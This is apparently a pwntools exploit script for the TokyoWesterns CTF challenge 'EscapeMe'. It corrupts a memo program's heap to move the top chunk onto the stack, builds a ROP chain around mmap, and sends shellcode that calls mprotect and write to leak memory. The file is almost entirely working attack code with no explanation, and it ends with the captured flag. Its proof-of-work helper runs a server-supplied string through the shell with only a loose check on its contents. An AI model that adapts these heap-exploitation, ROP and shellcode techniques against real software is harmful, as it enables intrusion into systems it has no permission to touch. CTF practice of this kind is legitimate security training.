#!/usr/bin/env python2

from pwn import *
import sys
import os
import subprocess

host, port = 'escapeme.chal.ctf.westerns.tokyo', 16359
local = False
if len(sys.argv) == 1:
  host = '127.0.0.1'
  local = True

def proof_of_work():
    chal = r.recvline().strip()
    assert 'hashcash -mb' in chal
    print(chal)
    r.sendline(subprocess.check_output(chal, shell=True).strip())

if local:
    r = process(['./kvm.elf', 'kernel.bin', 'memo-static.elf'])
else:
    r = remote(host, port)
    proof_of_work()
    r.sendlineafter('Any other modules? (space split) >', '')

context.arch = 'amd64'

def pt():
    r.recvuntil('Exit')

def alloc(data):
    pt()
    r.sendline('1')
    r.sendafter('memo', data)

def edit(idx, data):
    pt()
    r.sendline('2')
    r.sendlineafter('id', str(idx))
    r.sendafter('memo', data)

def free(idx):
    pt()
    r.sendline('3')
    r.sendlineafter('id', str(idx))

mmap_ptr = 0x0000007fff1ff000
stack = 0x0000007fffffffb8 # return address of read in alloc
top_chunk_at = 0x604098
c_at = mmap_ptr + 0x20
alloc(
        # prepare args of mmap
        p64(0) + p32(0) + p32(0xffffffff) + p32(34) + p32(7) + p64(0x1000) + p64(0)
)
alloc('B' * 0x28)
alloc(flat(0, 0x51, c_at - 0x18, c_at - 0x10).ljust(0x28, 'C'))
alloc('D' * 0x28)
alloc('E' * 0x28)
alloc('F' * 0x28)
edit(3, 'D' * 0x20 + p64(0x50) + p8(0x30))
free(4)

fake_top = 0x604038
edit(2, p32(top_chunk_at)[0:3])
edit(1, p32(fake_top)[0:3])
for i in range(3):
    # dummy malloc
    alloc('\x00' * 40)

alloc('\x00' * 32 + p64(stack)) # let top chunk points to stack

# rop!
# ret 2 getint: 0x40055d
rbx = 0
rbp = stack - 0x10 + 0x80
pop_rbp = 0x400230
mmap = 0x400596
main = 0x400190
alloc(flat(rbx, rbp, 0x40055d, 0, 0))
#          ^ here is stack + 16
# now will call getnline(rbp-0x80, 88)
shellcode_at = 0x0000007fff1fe000
r.send(flat(
    # set rbp on heap
    pop_rbp, 0x606020 + 0x38,
    mmap, # args on rbp-0x38 ~ -0x18
    stack + 0x30, 
    0x40050d,
    stack, 0, 0, 0,
    shellcode_at
    ).ljust(88, '\x00'))

shellcode = asm('''
        mov rax, 0x10c8
        syscall
        push rax
        pop rbp
    end:
''' + shellcraft.mprotect('rbp', 0x1000, 7) + shellcraft.write(1, 'rbp', 60))
r.send(shellcode)

r.interactive()
# TWCTF{fr33ly_3x3cu73_4ny_5y573m_c4ll}
